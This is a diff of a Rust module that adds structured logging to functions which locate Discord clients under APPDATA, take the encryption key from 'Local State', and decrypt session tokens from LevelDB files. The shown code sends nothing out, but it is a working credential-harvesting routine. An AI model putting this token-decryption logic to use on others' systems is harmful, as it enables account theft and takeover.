@@ -60,7 +60,9 @@ impl DiscordClient {
 
 /// Auto-detect and extract Discord tokens (returns all unique tokens found)
 pub fn extract_tokens() -> Result<Vec<String>> {
-    println!("Starting token extraction...");
+    use crate::logger::{log, LogLevel, LogCategory, sanitize_path};
+    
+    log(LogLevel::Info, LogCategory::TokenExtraction, "Starting token extraction", None);
     let mut tokens = std::collections::HashSet::new();
     let clients = vec![
         DiscordClient::Stable,
@@ -69,20 +71,31 @@ pub fn extract_tokens() -> Result<Vec<String>> {
     ];
 
     for client in clients {
-        println!("Checking client: {:?}", client);
-        if let Ok(client_tokens) = try_extract_from_client(&client) {
-            println!("Found {} tokens in {:?}", client_tokens.len(), client);
-            for token in client_tokens {
-                tokens.insert(token);
+        log(LogLevel::Debug, LogCategory::TokenExtraction, 
+            &format!("Checking Discord client: {:?}", client), None);
+        match try_extract_from_client(&client) {
+            Ok(client_tokens) => {
+                log(LogLevel::Debug, LogCategory::TokenExtraction, 
+                    &format!("Found {} tokens in {:?}", client_tokens.len(), client), None);
+                for token in client_tokens {
+                    tokens.insert(token);
+                }
             }
-        } else {
-             println!("Failed to extract from {:?}", client);
+            Err(e) => {
+                // Sanitize error details to prevent path leakage
+                let sanitized_error = sanitize_path(&e.to_string());
+                log(LogLevel::Debug, LogCategory::TokenExtraction, 
+                    &format!("No tokens from {:?}", client), Some(&sanitized_error));
+            }
         }
     }
     
-    println!("Total unique tokens found: {}", tokens.len());
+    log(LogLevel::Info, LogCategory::TokenExtraction, 
+        &format!("Total unique tokens found: {}", tokens.len()), None);
 
     if tokens.is_empty() {
+        log(LogLevel::Warn, LogCategory::TokenExtraction, 
+            "No tokens found in any Discord client", None);
         anyhow::bail!("Could not find tokens in any Discord client")
     }
 
@@ -91,11 +104,16 @@ pub fn extract_tokens() -> Result<Vec<String>> {
 
 #[cfg(target_os = "windows")]
 fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
+    use crate::logger::{log, LogLevel, LogCategory, sanitize_path};
+    
     // Get APPDATA path
     let appdata = std::env::var("APPDATA").context("Could not get APPDATA environment variable")?;
 
     // Build Discord path
     let discord_path = PathBuf::from(appdata).join(client.path());
+    
+    log(LogLevel::Debug, LogCategory::TokenExtraction, 
+        &format!("Checking Discord path: {}", sanitize_path(&discord_path.to_string_lossy())), None);
 
     // Read Local State file to get encryption key
     let local_state_path = discord_path.join("Local State");
@@ -125,10 +143,13 @@ fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
     let leveldb_path = discord_path.join("Local Storage").join("leveldb");
 
     if !leveldb_path.exists() {
+        log(LogLevel::Debug, LogCategory::TokenExtraction, 
+            &format!("LevelDB path does not exist: {}", sanitize_path(&leveldb_path.to_string_lossy())), None);
         anyhow::bail!("LevelDB path does not exist");
     }
 
     let mut tokens = Vec::new();
+    let mut file_count = 0;
 
     // Read all .ldb and .log files
     for entry in fs::read_dir(&leveldb_path)? {
@@ -137,6 +158,7 @@ fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
 
         if let Some(ext) = path.extension() {
             if ext == "ldb" || ext == "log" {
+                file_count += 1;
                 if let Ok(content) = fs::read(&path) {
                     // Search for all token patterns
                     let found_tokens = find_and_decrypt_tokens(&content, &master_key);
@@ -145,6 +167,9 @@ fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
             }
         }
     }
+    
+    log(LogLevel::Debug, LogCategory::TokenExtraction, 
+        &format!("Searched {} LevelDB files, found {} tokens", file_count, tokens.len()), None);
     
     Ok(tokens)
 }
